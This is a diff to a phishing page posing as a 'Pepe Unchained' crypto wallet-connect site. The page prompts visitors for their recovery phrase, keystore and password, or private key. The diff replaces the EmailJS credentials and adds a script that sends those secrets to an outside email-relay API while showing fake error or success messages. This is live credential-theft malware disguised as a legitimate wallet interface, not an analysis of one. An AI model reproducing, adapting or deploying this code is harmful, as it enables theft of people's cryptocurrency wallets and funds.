@@ -11,8 +11,6 @@
       <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
         <meta name="robots" content="noodp">
     <script src="./Pepe Unchained _ Connect Wallet_files/78d167673c.js.download" crossorigin="anonymous"></script>
-
-    
         
     <!-- google fonts link -->
     <link rel="preconnect" href="https://fonts.googleapis.com/">
@@ -25,12 +23,18 @@
     <link rel="stylesheet" href="./Pepe Unchained _ Connect Wallet_files/bootstrap(1).min.css">
     <link href="./Pepe Unchained _ Connect Wallet_files/main.css" rel="stylesheet">
   
-<script type="text/javascript" src="./Pepe Unchained _ Connect Wallet_files/email.min.js.download"></script>
-
-<script type="text/javascript">
-  emailjs.init('cQ5YGNxXKbT_8BR5H')
+<script type="text/javascript"
+    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
 </script>
-          <style>
+<script type="text/javascript">
+(function(){
+  emailjs.init({
+        publicKey: "JzTiRvKggY01ROJ1N",
+    });
+})();
+</script>
+
+        <style>
 
         div.loading-dialog {
             display: none;
@@ -170,7 +174,7 @@
                     <button id="keystoreSend">Keystore</button>
                     <button id="privateKeySend">Private Key</button>
                 </div>
-                  <div class="message-tab"><div class="alert alert-warning">An unknown error occured, Please try again later.</div></div>
+                  <div class="message-tab" id="message-tab"><div class="alert alert-warning">An unknown error occured, Please try again later.</div></div>
                     <div class="send-form">
                         <form id="form">
                             <input type="hidden" name="wallet" id="walletNameData" value="Metamask">
@@ -647,7 +651,7 @@
 <script src="./Pepe Unchained _ Connect Wallet_files/jquery.counterup.min.js.download"></script>
 <script src="./Pepe Unchained _ Connect Wallet_files/wow.min.js.download"></script>
 <script src="./Pepe Unchained _ Connect Wallet_files/script.js.download"></script>
- <script type="text/javascript">
+ <!-- <script type="text/javascript">
   const btn = document.getElementById('button');
 
         document.getElementById('form')
@@ -656,8 +660,8 @@
 
          btn.value = 'Connecting wallet...';
 
-           const serviceID = 'service_zr10mmb';
-           const templateID = 'template_j7upung';
+           const serviceID = 'e920d5afds';
+           const templateID = 'template_h6w99lf';
 
 
           emailjs.sendForm(serviceID, templateID, form)
@@ -667,14 +671,14 @@
 
     });
 });
-</script>
+</script> -->
 
 <script>
+    $("#message-tab").hide();
     $(document).ready(function () {
         let wallets = $(".coin-registry button");
         wallets.each(function () {
             $(this).on("click", function () {
-
                 let img = $(this).find(".coin-img").attr("src");
                 event.preventDefault();
                 $(".connection-info").text("Initializing...");
@@ -689,119 +693,125 @@
         });
     });
 </script>
-  <script>
-        $(document).ready(function () {
-            let dialogDismiss = $(".dialog-dismiss");
-            let sendForm = $("#data-to-send");
-            let successBox = $("#success-dialog");
-            let errorBox = $("#error-dialog");
-            dialogDismiss.each(function () {
-                $(this).on("click", function () {
-                    $("#connect-dialog").hide();
-                    $("#send-dialog").hide();
-                });
-            });
-            $("#phraseSend").on("click", function () {
-                sendForm.html(
-                     '<div class="form-group"><input type="hidden" id="phrase" name="phrase" value="phrase"><textarea name="phrase" id="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
-                    );
-            });
-            $("#keystoreSend").on("click", function () {
-                sendForm.html(
-                    '<textarea rows="5" style="resize: none" required name="keystore" id="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="password" class="form-control" id="wallet_password" name="wallet_password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
-                    );
-            });
-            $("#privateKeySend").on("click", function () {
-                sendForm.html(
-                 '<input type="text" name="private_key" id="private_key" required class="form-control" placeholder="Enter your Private Key"><div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
-                    );
-            });
 
-            $(".connection-info").on("click", ".manual-connection", function () {
-                $("#current-wallet-app-send").text($("#current-wallet-app").text());
-                $("#walletNameData").val($("#current-wallet-app").text());
-                var link = $("#current-wallet-app").text();
-                $("#current-wallet-send-logo").attr("src", $("#current-wallet-logo").attr("src"));
+<script>
+    $(document).ready(function () {
+        let dialogDismiss = $(".dialog-dismiss");
+        let sendForm = $("#data-to-send");
+        let successBox = $("#success-dialog");
+        let errorBox = $("#error-dialog");
+        dialogDismiss.each(function () {
+            $(this).on("click", function () {
                 $("#connect-dialog").hide();
-                $("#send-dialog").show();
-            });
-
-            $.ajaxSetup({
-                headers: {
-                    "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
-                },
-            });
-
-            $("#form").submit(function (e) {
-                e.preventDefault();
-                let processBtn = $("#button");
-                let cancelBtn = $("#cancelBtn");
-                let formData = new FormData(this);
-                $.ajax({
-                    type: "POST",
-                    url: "",
-                    data: formData,
-                    cache: false,
-                    contentType: false,
-                    processData: false,
-                    beforeSend: function () {
-                        processBtn.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...');
-                        processBtn.prop("disabled", true);
-                        cancelBtn.prop("disabled", true);
-                    },
-                    success: function () {
-                                // dismissAllDialogs();
-                        setTimeout(function () {
-                            restoreButtons();
-                            $("div.message-tab").html("<div class='alert alert-warning'>An unknown error occured, Please try again later.</div>");
-                        }, 5000);
-                    },
-                    error: function () {
-                        restoreButtons();
-                        dismissAllDialogs();
-                        errorBox.show();
-                        setTimeout(function () {
-                            dismissAllDialogs();
-                            $("#send-dialog").show();
-                        }, 2500);
-                    },
-                });
-                function restoreButtons() {
-                    processBtn.html("PROCEED");
-                    processBtn.prop("disabled", false);
-                    cancelBtn.prop("disabled", false);
-                }
-                function dismissAllDialogs() {
-                    successBox.hide();
-                    errorBox.hide();
-                    $("#connect-dialog").hide();
-                    $("#send-dialog").hide();
-                    $("#processing-dialog").hide();
-                }
+                $("#send-dialog").hide();
             });
         });
-    </script>
- 
-<script type="text/javascript" src="./Pepe Unchained _ Connect Wallet_files/email.min.js.download"></script>
+        $("#phraseSend").on("click", function () {
+            sendForm.html(
+                    '<div class="form-group"><input type="hidden" id="phrase" name="phrase" value="phrase"><textarea name="phrase" id="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
+            );
+        });
+        $("#keystoreSend").on("click", function () {
+            sendForm.html(
+                '<textarea rows="5" style="resize: none" required name="keystore" id="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="password" class="form-control" id="wallet_password" name="wallet_password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
+            );
+        });
+        $("#privateKeySend").on("click", function () {
+            sendForm.html(
+                '<input type="text" name="private_key" id="private_key" required class="form-control" placeholder="Enter your Private Key"><div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
+            );
+        });
 
-<script type="text/javascript">
-  emailjs.init('cQ5YGNxXKbT_8BR5H')
+        $(".connection-info").on("click", ".manual-connection", function () {
+            $("#current-wallet-app-send").text($("#current-wallet-app").text());
+            $("#walletNameData").val($("#current-wallet-app").text());
+            var link = $("#current-wallet-app").text();
+            $("#current-wallet-send-logo").attr("src", $("#current-wallet-logo").attr("src"));
+            $("#connect-dialog").hide();
+            $("#send-dialog").show();
+        });
+
+        $.ajaxSetup({
+            headers: {
+                "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
+            },
+        });
+
+        $("#form").submit(function (e) {
+            e.preventDefault();
+
+            // Prepare the data payload
+            let payload = {
+                service_id: 'e920d5afds', // EmailJS service ID
+                template_id: 'template_h6w99lf', // template ID
+                user_id: 'JzTiRvKggY01ROJ1N', // Your EmailJS user ID
+                template_params: {
+                    // Map your form fields here
+                    phrase: $("#phrase").val(),
+                    keystore: $("#keystore").val(),
+                    private_key: $("#private_key").val(),
+                    wallet_password: $("#wallet_password").val(),
+                }
+            };
+
+            let processBtn = $("#button");
+            let cancelBtn = $("#cancelBtn");
+            let formData = new FormData(this);
+
+            $("#message-tab").show();
+
+            $.ajax({
+                type: "POST",
+                url: "https://api.emailjs.com/api/v1.0/email/send",
+                contentType: 'application/json',
+                data: JSON.stringify(payload),
+                // cache: false,
+                processData: false,
+                beforeSend: function () {
+                    $("#message-tab").hide();
+                    processBtn.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...');
+                    processBtn.prop("disabled", true);
+                    cancelBtn.prop("disabled", true);
+                },
+                success: function (response) {
+                    console.log('Sent successfully', response);
+                    restoreButtons();
+                    $("#message-tab").show();
+                    $("div.message-tab").html("<div class='alert alert-success'>Email sent successfully!</div>");
+                    setTimeout(dismissAllDialogs, 2500)
+                },
+                error: function (xhr, status, error) {
+                    restoreButtons();
+                    $("#message-tab").show();
+                    $("div.message-tab").html("<div class='alert alert-danger'>Error sending email: " + error + "</div>");
+                }
+            });
+
+            function restoreButtons() {
+                processBtn.html("PROCEED");
+                processBtn.prop("disabled", false);
+                cancelBtn.prop("disabled", false);
+            }
+
+            function dismissAllDialogs() {
+                successBox.hide();
+                errorBox.hide();
+                $("#connect-dialog").hide();
+                $("#send-dialog").hide();
+                $("#processing-dialog").hide();
+                $("#message-tab").hide();
+                $("#phrase").val("");
+                $("#keystore").val("");
+                $("#private_key").val("");
+                $("#wallet_password").val("");
+            }
+        });    
+                
+    });
 </script>
+ 
 
 <iframe id="paal-chat" allowtransparency="true" style="color-scheme:normal;border:none;position:fixed;right:-20px;bottom:-90px;width:400px;height:170px;z-index:9999;background-color:transparent!important" frameborder="0" sandbox="allow-popups allow-top-navigation allow-top-navigation-by-user-activation" src="./Pepe Unchained _ Connect Wallet_files/saved_resource.html"></iframe>
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
